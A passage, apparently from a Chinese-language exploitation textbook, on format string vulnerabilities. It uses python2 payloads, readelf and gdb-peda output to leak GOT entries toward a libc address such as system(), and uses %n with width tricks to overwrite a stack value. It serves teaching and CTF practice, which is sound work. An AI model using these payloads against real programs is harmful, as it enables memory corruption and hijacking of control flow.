0xffffd54c: 0x08048520 0xffffd584 0x00000001
0x88888888
0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584
0x080481fc
0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd57c: 0x00004443 0x00000000 0xffffd57a
0x3331252e
0xffffd58c: 0x00007324 0xffffd5ca 0x00000001
0x000000c2
gdb-peda$ x/s 0xffffd57a
0xffffd57a: "ABCD"
gdb-peda$ c
Continuing.
z    .ABCD
当然这也没有什么用，我们真正经常用到的地方是，把程序中某函数的 GOT 地址
传进去，然后获得该地址所对应的函数的虚拟地址。然后根据函数在 libc 中的相对
位置，计算出我们需要的函数地址（如 system() ）。如下面展示的这样：
先看一下重定向表：
337
3.1.1 格式化字符串漏洞
$ readelf -r a.out
Relocation section '.rel.dyn' at offset 0x2e8 contains 1 entries
:
Offset Info Type Sym.Value Sym. Name
08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__
Relocation section '.rel.plt' at offset 0x2f0 contains 4 entries
:
Offset Info Type Sym.Value Sym. Name
0804a00c 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0
0804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_mai
n@GLIBC_2.0
0804a014 00000407 R_386_JUMP_SLOT 00000000 putchar@GLIBC_2.
0
0804a018 00000507 R_386_JUMP_SLOT 00000000 __isoc99_scanf@G
LIBC_2.7
.rel.plt 中有四个函数可供我们选择，按理说选择任意一个都没有问题，但是
在实践中我们会发现一些问题。下面的结果分别是
printf 、 __libc_start_main 、 putchar 和 __isoc99_scanf ：
338
3.1.1 格式化字符串漏洞
$ python2 -c 'print("\x0c\xa0\x04\x08"+".%p"*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x804
84b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e702
5.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7
025
$ python2 -c 'print("\x10\xa0\x04\x08"+".%p"*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x804
84b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e
.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e7025
2e
$ python2 -c 'print("\x14\xa0\x04\x08"+".%p"*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x804
84b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e
.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e7025
2e
$ python2 -c 'print("\x18\xa0\x04\x08"+".%p"*20)' | ./a.out
▒.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80
484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252
e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e702
52e
细心一点你就会发现第一个（ printf ）的结果有问题。我们输入了
\x0c\xa0\x04\x08 （ 0x0804a00c ），可是 13 号位置输出的结果却是
0x2e0804a0 ，那么， \x0c 哪去了，查了一下 ASCII 表：
Oct Dec Hex Char
──────────────────────────────────────
014 12 0C FF '\f' (form feed)
于是就被省略了，同样会被省略的还有很多，如
\x07 （'\a'）、 \x08 （'\b'）、 \x20 （SPACE）等的不可见字符都会被省略。
这就会让我们后续的操作出现问题。所以这里我们选用最后一个
（ __isoc99_scanf ）。
$ python2 -c 'print("\x18\xa0\x04\x08"+"%13$s")' > text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done
339
3.1.1 格式化字符串漏洞
.
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r  0x804a018 --> 0xf7e3a790 (:
push ebp)
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd54c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd54c --> 0x8048520 (: add esp,0x20)
0004| 0xffffd550 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (: push ebp)
0008| 0xffffd554 --> 0x1
0012| 0xffffd558 --> 0x88888888
0016| 0xffffd55c --> 0xffffffff
0020| 0xffffd560 --> 0xffffd57a ("ABCD")
340
3.1.1 格式化字符串漏洞
0024| 0xffffd564 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (: push ebp)
0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8')
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20w $esp
0xffffd54c: 0x08048520 0xffffd584 0x00000001
0x88888888
0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584
0x080481fc
0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd57c: 0x00004443 0x00000000 0x0804a018
0x24333125
0xffffd58c: 0x00f00073 0xffffd5ca 0x00000001
0x000000c2
gdb-peda$ x/w 0x804a018
0x804a018: 0xf7e3a790
gdb-peda$ c
Continuing.
▒    
虽然我们可以通过 x/w 指令得到 __isoc99_scanf 函数的虚拟地址
0xf7e3a790 。但是由于 0x804a018 处的内容是仍然一个指针，使用 %13$s
打印并不成功。在下面的内容中将会介绍怎样借助 pwntools 的力量，来获得正确
格式的虚拟地址，并能够对它有进一步的利用。
当然并非总能通过使用 4 字节的跳转（如 AAAA ）来步进参数指针去引用格式字
符串的起始部分，有时，需要在格式字符串之前加一个、两个或三个字符的前缀来
实现一系列的 ４ 字节跳转。
覆盖栈内容
341
3.1.1 格式化字符串漏洞
现在我们已经可以读取栈上和任意地址的内存了，接下来我们更进一步，通过修改
栈和内存来劫持程序的执行流程。 %n 转换指示符将 %n 当前已经成功写入流或
缓冲区中的字符个数存储到地址由参数指定的整数中。
#include
void main() {
int i;
char str[] = "hello";
printf("%s %n\n", str, &i);
printf("%d\n", i);
}
$ ./a.out
hello
6
i 被赋值为 6，因为在遇到转换指示符之前一共写入了 6 个字符（ hello 加上
一个空格）。在没有长度修饰符时，默认写入一个 int 类型的值。
通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一
个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入
的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果
实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（ 0 补齐
时在宽度前加点 . 或 0 ）。如：
#include
void main() {
int i;
printf("%10u%n\n", 1, &i);
printf("%d\n", i);
printf("%.50u%n\n", 1, &i);
printf("%d\n", i);
printf("%0100u%n\n", 1, &i);
printf("%d\n", i);
}
342
3.1.1 格式化字符串漏洞
$ ./a.out
1
10
00000000000000000000000000000000000000000000000001
50
0000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000001
100
就是这样，下面我们把地址 0x8048000 写入内存：
printf("%0134512640d%n\n", 1, &i);
$ ./a.out
...
0x8048000
还是我们一开始的程序，我们尝试将 arg2 的值更改为任意值（比如
0x00000020 ，十进制 32），在 gdb 中可以看到得到 arg2 的地址
0xffffd538 ，那么我们构造格式字符串
\x38\xd5\xff\xff%08x%08x%012d%13$n ，其中 \x38\xd5\xff\xff 表示
arg2 的地址，占 4 字节， %08x%08x 表示两个 8 字符宽的十六进制数，占 16
字节， %012d 占 12 字节，三个部分加起来就占了 4+16+12=32 字节，即把
arg2 赋值为 0x00000020 。格式字符串最后一部分 %13$n 也是最重要的一
部分，和上面的内容一样，表示格式字符串的第 13 个参数，即写入 0xffffd538
的地方（ 0xffffd564 ）， printf() 就是通过这个地址找到被覆盖的内容的：
$ python2 -c 'print("\x38\xd5\xff\xff%08x%08x%012d%13$n")' > tex
t
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done
.
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r  0xffffd538 --> 0x88888888
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd52c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd52c --> 0x8048520 (: add esp,0x20)
0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888
0008| 0xffffd534 --> 0x1
0012| 0xffffd538 --> 0x88888888
0016| 0xffffd53c --> 0xffffffff
0020| 0xffffd540 --> 0xffffd55a ("ABCD")
0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888
0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
344
3.1.1 格式化字符串漏洞
gdb-peda$ x/20x $esp
0xffffd52c: 0x08048520 0xffffd564 0x00000001
0x88888888
0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564
0x080481fc
0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd55c: 0x00004443 0x00000000 0xffffd538
0x78383025
0xffffd56c: 0x78383025 0x32313025 0x33312564
0x00006e24
gdb-peda$ finish
Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/l
ibc.so.6
[----------------------------------registers--------------------
---------------]
EAX: 0x20 (' ')
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x0
EDX: 0xf7f98830 --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ')
EIP: 0x8048520 (: add esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048514 : lea eax,[ebp-0x94]
0x804851a : push eax
0x804851b : call 0x8048350 
=> 0x8048520 : add esp,0x20
0x8048523 : sub esp,0xc
0x8048526 : push 0xa
0x8048528 : call 0x8048370 